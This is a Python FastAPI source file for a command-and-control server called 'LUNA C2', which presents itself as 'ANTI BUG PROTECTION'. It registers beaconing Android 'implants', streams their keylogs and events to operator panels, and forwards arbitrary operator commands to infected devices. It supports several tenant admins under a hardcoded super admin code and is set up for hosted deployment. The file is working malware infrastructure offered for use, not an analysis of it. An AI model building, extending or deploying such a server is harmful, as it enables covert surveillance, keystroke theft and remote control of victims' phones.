"""
LUNA ANTI BUG PROTECTION — C2 + Admin Panel
Multi-tenant, WebSocket live, Render-ready.
Super admin code: 222008
"""

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Form, HTTPException, Depends
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from typing import Dict, List, Optional, Set
import json
import secrets
import time
import asyncio
from datetime import datetime

app = FastAPI(title="LUNA C2", docs_url=None, redoc_url=None)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# ─────────────────────────────────────────────
# In-memory store (swap to SQLite/Redis later)
# ─────────────────────────────────────────────

SUPER_CODE = "222008"

# login_code -> {admin_id, label, is_super}
admins: Dict[str, dict] = {
    SUPER_CODE: {
        "admin_id": "SUPER",
        "label": "Super Admin",
        "is_super": True,
        "created": time.time()
    }
}

# device_id -> device info
devices: Dict[str, dict] = {}

# admin_id -> set of websocket connections (panel side)
panel_clients: Dict[str, Set[WebSocket]] = {}

# device_id -> implant websocket
implant_sockets: Dict[str, WebSocket] = {}

# Simple session tokens for panel
sessions: Dict[str, str] = {}  # token -> login_code


# ─────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────

def get_admin_from_token(token: str) -> Optional[dict]:
    code = sessions.get(token)
    if not code:
        return None
    return admins.get(code)


def devices_for_admin(admin: dict) -> List[dict]:
    if admin.get("is_super"):
        return list(devices.values())
    aid = admin.get("admin_id")
    return [d for d in devices.values() if d.get("admin_id") == aid]


async def broadcast_to_panels(admin_id: str, payload: dict):
    """Push update to every panel websocket belonging to this admin (or super)."""
    targets = set()
    # Super always gets everything
    if "SUPER" in panel_clients:
        targets |= panel_clients["SUPER"]
    if admin_id in panel_clients:
        targets |= panel_clients[admin_id]

    dead = []
    for ws in targets:
        try:
            await ws.send_json(payload)
        except Exception:
            dead.append(ws)
    for ws in dead:
        for s in panel_clients.values():
            s.discard(ws)


# ─────────────────────────────────────────────
# Auth routes
# ─────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})


@app.post("/login")
async def login(code: str = Form(...)):
    code = code.strip()
    if code not in admins:
        return JSONResponse({"ok": False, "error": "Invalid code"}, status_code=401)
    token = secrets.token_urlsafe(32)
    sessions[token] = code
    return JSONResponse({"ok": True, "token": token, "admin": admins[code]})


@app.post("/api/create_admin")
async def create_admin(request: Request):
    body = await request.json()
    token = request.headers.get("X-Token") or body.get("token")
    admin = get_admin_from_token(token or "")
    if not admin or not admin.get("is_super"):
        raise HTTPException(403, "Super only")

    new_code = str(body.get("code", "")).strip()
    new_id = str(body.get("admin_id", "")).strip()
    label = str(body.get("label", new_id)).strip()

    if not new_code or not new_id:
        raise HTTPException(400, "code and admin_id required")
    if new_code in admins:
        raise HTTPException(400, "code already exists")

    admins[new_code] = {
        "admin_id": new_id,
        "label": label,
        "is_super": False,
        "created": time.time()
    }
    return {"ok": True, "admin": admins[new_code]}


@app.get("/api/admins")
async def list_admins(request: Request):
    token = request.headers.get("X-Token")
    admin = get_admin_from_token(token or "")
    if not admin or not admin.get("is_super"):
        raise HTTPException(403, "Super only")
    return {"admins": [
        {"code": c, **a} for c, a in admins.items()
    ]}


@app.get("/api/devices")
async def list_devices(request: Request):
    token = request.headers.get("X-Token")
    admin = get_admin_from_token(token or "")
    if not admin:
        raise HTTPException(401, "Unauthorized")
    return {"devices": devices_for_admin(admin)}


# ─────────────────────────────────────────────
# Panel page
# ─────────────────────────────────────────────

@app.get("/panel", response_class=HTMLResponse)
async def panel(request: Request):
    return templates.TemplateResponse("panel.html", {"request": request})


# ─────────────────────────────────────────────
# WebSocket — Implant side
# ─────────────────────────────────────────────

@app.websocket("/ws")
async def implant_ws(websocket: WebSocket):
    await websocket.accept()
    device_id = None
    try:
        while True:
            raw = await websocket.receive_text()
            try:
                msg = json.loads(raw)
            except Exception:
                continue

            mtype = msg.get("type")

            if mtype == "beacon":
                device_id = msg.get("device_id") or f"unknown-{int(time.time())}"
                devices[device_id] = {
                    "device_id": device_id,
                    "admin_id": msg.get("admin_id", "UNKNOWN"),
                    "model": msg.get("model", "?"),
                    "manufacturer": msg.get("manufacturer", "?"),
                    "android": msg.get("android", "?"),
                    "sdk": msg.get("sdk", 0),
                    "package": msg.get("package", ""),
                    "last_seen": time.time(),
                    "online": True
                }
                implant_sockets[device_id] = websocket
                await broadcast_to_panels(
                    devices[device_id]["admin_id"],
                    {"type": "device_update", "device": devices[device_id]}
                )
            else:
                # Command result or keylog / event from implant
                if device_id and device_id in devices:
                    devices[device_id]["last_seen"] = time.time()
                await broadcast_to_panels(
                    devices.get(device_id, {}).get("admin_id", "SUPER"),
                    {"type": "event", "device_id": device_id, "data": msg}
                )

    except WebSocketDisconnect:
        pass
    finally:
        if device_id:
            if device_id in devices:
                devices[device_id]["online"] = False
                devices[device_id]["last_seen"] = time.time()
                await broadcast_to_panels(
                    devices[device_id]["admin_id"],
                    {"type": "device_update", "device": devices[device_id]}
                )
            implant_sockets.pop(device_id, None)


# ─────────────────────────────────────────────
# WebSocket — Panel side
# ─────────────────────────────────────────────

@app.websocket("/panel/ws")
async def panel_ws(websocket: WebSocket):
    await websocket.accept()
    token = None
    admin = None
    admin_key = None
    try:
        # First message must be auth
        auth_raw = await websocket.receive_text()
        auth = json.loads(auth_raw)
        token = auth.get("token")
        admin = get_admin_from_token(token or "")
        if not admin:
            await websocket.send_json({"type": "error", "error": "unauthorized"})
            await websocket.close()
            return

        admin_key = "SUPER" if admin.get("is_super") else admin.get("admin_id")
        if admin_key not in panel_clients:
            panel_clients[admin_key] = set()
        panel_clients[admin_key].add(websocket)

        # Send current device list
        await websocket.send_json({
            "type": "device_list",
            "devices": devices_for_admin(admin)
        })

        while True:
            raw = await websocket.receive_text()
            try:
                msg = json.loads(raw)
            except Exception:
                continue

            if msg.get("type") == "command":
                device_id = msg.get("device_id")
                cmd = msg.get("cmd")
                if not device_id or not cmd:
                    continue
                # Ownership check
                dev = devices.get(device_id)
                if not dev:
                    await websocket.send_json({"type": "error", "error": "device offline"})
                    continue
                if not admin.get("is_super") and dev.get("admin_id") != admin.get("admin_id"):
                    await websocket.send_json({"type": "error", "error": "not your device"})
                    continue

                # Forward to implant
                sock = implant_sockets.get(device_id)
                if sock:
                    try:
                        await sock.send_text(json.dumps(cmd))
                        await websocket.send_json({"type": "ack", "id": cmd.get("id")})
                    except Exception:
                        await websocket.send_json({"type": "error", "error": "send failed"})
                else:
                    await websocket.send_json({"type": "error", "error": "implant not connected"})

    except WebSocketDisconnect:
        pass
    finally:
        if admin_key and admin_key in panel_clients:
            panel_clients[admin_key].discard(websocket)


# ─────────────────────────────────────────────
# Health (Render)
# ─────────────────────────────────────────────

@app.get("/health")
async def health():
    return {"status": "ok", "devices": len(devices), "admins": len(admins)}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
